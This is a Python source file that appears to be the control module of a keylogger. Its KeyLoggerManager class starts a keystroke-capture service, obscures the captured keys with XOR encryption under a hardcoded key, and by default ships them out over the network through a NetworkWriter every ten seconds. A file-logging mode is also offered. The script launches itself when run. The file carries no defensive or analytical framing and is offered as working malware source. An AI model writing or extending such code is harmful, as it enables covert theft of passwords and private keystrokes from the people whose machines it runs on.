from urllib3.filepost import writer

from  KeyloggerService import *
from FileWriter import *
import threading
import time
from  IEncryptor import *
from network_writer import *

from modules.Encryptor import XOREncryptor




class KeyLoggerManager:

    def __init__(self, mode = "network"):
        self.instance = KeyloggerService()
        self.encryptor :  IEncryptor = XOREncryptor()
        self.mode = mode

        if  self.mode == "network":
            self.writer = NetworkWriter()
        else:
            self.writer  = FileWriter()

    def start(self):
        self.instance.start()
        while self.instance.return_action():
            True
        return

    def write_data(self):
        while self.instance.return_action():
            encrypted_data = self.xor_encryption()
            if self.mode == "network":
                stop_key_logger = self.writer.write(encrypted_data)
                if not stop_key_logger:
                    self.instance.start()
                time.sleep(10)
            else:
                self.writer.write(encrypted_data)
                time.sleep(3)


    def xor_encryption(self):
        return self.encryptor.encryption(self.instance.get_data(),"abc")


    def main(self):
        threading.Thread(target=self.start).start()
        time.sleep(0.1)
        threading.Thread(target=self.write_data).start()



A = KeyLoggerManager()
A.main()
